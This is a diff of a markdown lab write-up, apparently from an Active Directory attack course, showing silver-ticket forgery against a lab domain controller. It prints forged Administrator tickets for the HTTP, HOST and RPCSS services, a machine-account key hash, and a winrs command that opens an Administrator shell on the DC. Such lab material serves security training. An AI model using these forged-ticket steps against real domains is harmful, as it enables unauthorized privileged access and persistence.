@@ -1,4 +1,4 @@
-# Learning Objective 09
+# Learning Objective 09 (Persistence | Silver Ticket)
 
 ## Tasks
 
@@ -14,23 +14,15 @@
 
 From the information gathered in the previous steps (see *Learning Objective 07*) we have the hash for the machine account of the domain controller (`dcorp-dc$`).
 
-Note that we are NOT using the `krbtgt` hash here. Using the below command, we can create a silver ticket that provides us access to the HTTP service (WinRM) on DC.
+**Note that we are NOT using the `krbtgt` hash here**.
 
-Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance. You can also use aes256 keys in place of NTLM hash.
+Using the below command, we can create a silver ticket that provides us access to the HTTP service (WinRM) on DC.
+
+Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance. **You can also use aes256 keys in place of NTLM hash.**
 
 **HTTP Service**
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /groups`:
 ```
@@ -42,7 +34,7 @@ Group Name                                 Type             SID                 
 ========================================== ================ ============================================= ==================================================
 Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
 BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Group used for deny only❌
+BUILTIN\Administrators👥                   Alias            S-1-5-32-544                                  Group used for deny only❌
 BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
@@ -58,7 +50,7 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 ```
 [SNIP]
 
-[*] Action: Build TGS
+[*] Action: Build TGS📌
 
 [*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
 [*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
@@ -92,15 +84,15 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
 [*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
-[*] Service        : http
-[*] Target         : dcorp-dc.dollarcorp.moneycorp.local
+[*] Service        : http📌
+[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌
 
 [*] Generating EncTicketPart
 [*] Signing PAC
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGS for 'Administrator' to 'http/dcorp-dc.dollarcorp.moneycorp.local'
+[*] Forged a TGS for 'Administrator'🎭 to 'http/dcorp-dc.dollarcorp.moneycorp.local'
 
 [*] AuthTime       : 2/13/2025 5:01:30 AM
 [*] StartTime      : 2/13/2025 5:01:30 AM
@@ -137,8 +129,8 @@ Action: List Kerberos Tickets (Current User)
 
     [0] - 0x17 - rc4_hmac
       Start/End/MaxRenew: 2/13/2025 5:01:30 AM ; 2/13/2025 3:01:30 PM ; 2/20/2025 5:01:30 AM
-      Server Name       : http📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
-      Client Name       : Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+      Server Name       : http📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
+      Client Name       : Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
       Flags             : pre_authent, renewable, forwardable (40a00000)
 ```
 
@@ -148,8 +140,8 @@ Current LogonId is 0:0x848e43
 
 Cached Tickets: (1)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
-        Server: http📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+        Server: http📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 2/13/2025 5:01:30 (local)
@@ -161,7 +153,8 @@ Cached Tickets: (1)
 ```
 
 We have the HTTP service ticket for `dcorp-dc`, let’s try accessing it using winrs.
-Note that we are using FQDN of `dcorp-dc` as that is what the service ticket has.
+
+**Note that we are using FQDN of `dcorp-dc`** as that is what the service ticket has.
 
 `winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd`:
 ```
@@ -172,7 +165,7 @@ C:\Users\Administrator>
 ```
 🚀
 
-![Victim: dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+![dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -187,21 +180,13 @@ dcorp-dc
 
 **WMI Service**
 
-For accessing WMI, we need to create two tickets: one for HOST service and another for RPCSS. Run the below commands from an elevated shell.
+**For accessing WMI, we need to create two TGS tickets: one for HOST service and another for RPCSS.**
+
+Run the below commands **from an elevated shell**.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /groups`:
 ```
@@ -213,7 +198,7 @@ Group Name                                 Type             SID                 
 ========================================== ================ ============================================= ===============================================================
 Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
 BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
+BUILTIN\Administrators👥                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
 BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
@@ -231,7 +216,7 @@ Inject a ticket for HOST service.
 ```
 [SNIP]
 
-[*] Action: Build TGS
+[*] Action: Build TGS📌
 
 [*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
 [*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
@@ -266,14 +251,14 @@ Inject a ticket for HOST service.
 [*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
 [*] Service        : host📌
-[*] Target         : dcorp-dc.dollarcorp.moneycorp.local
+[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌
 
 [*] Generating EncTicketPart
 [*] Signing PAC
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGS for 'Administrator' to 'host/dcorp-dc.dollarcorp.moneycorp.local'
+[*] Forged a TGS for 'Administrator'🎭 to 'host/dcorp-dc.dollarcorp.moneycorp.local'
 
 [*] AuthTime       : 2/13/2025 5:10:56 AM
 [*] StartTime      : 2/13/2025 5:10:56 AM
@@ -293,7 +278,7 @@ Inject a ticket for RPCSS service.
 ```
 [SNIP]
 
-[*] Action: Build TGS
+[*] Action: Build TGS📌
 
 [*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
 [*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
@@ -328,14 +313,14 @@ Inject a ticket for RPCSS service.
 [*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
 [*] Service        : rpcss📌
-[*] Target         : dcorp-dc.dollarcorp.moneycorp.local
+[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌
 
 [*] Generating EncTicketPart
 [*] Signing PAC
 [*] Encrypting EncTicketPart
 [*] Generating Ticket
 [*] Generated KERB-CRED
-[*] Forged a TGS for 'Administrator' to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'
+[*] Forged a TGS for 'Administrator'🎭 to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'
 
 [*] AuthTime       : 2/13/2025 5:11:23 AM
 [*] StartTime      : 2/13/2025 5:11:23 AM
@@ -359,8 +344,8 @@ Current LogonId is 0:0x848dc4
 
 Cached Tickets: (2)
 
-#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
-        Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+        Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 2/13/2025 5:07:08 (local)
@@ -370,8 +355,8 @@ Cached Tickets: (2)
         Cache Flags: 0
         Kdc Called:
 
-#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
-        Server: host📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
+        Server: host📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
         Start Time: 2/13/2025 5:05:47 (local)
@@ -398,7 +383,7 @@ Organization    :
 BuildNumber     : 20348
 RegisteredUser  : Windows User
 SerialNumber    : 00454-30000-00000-AA745
-Version         : 10.0.20348
+Version         : 10.0.20348📌
 ```
 🚩
 
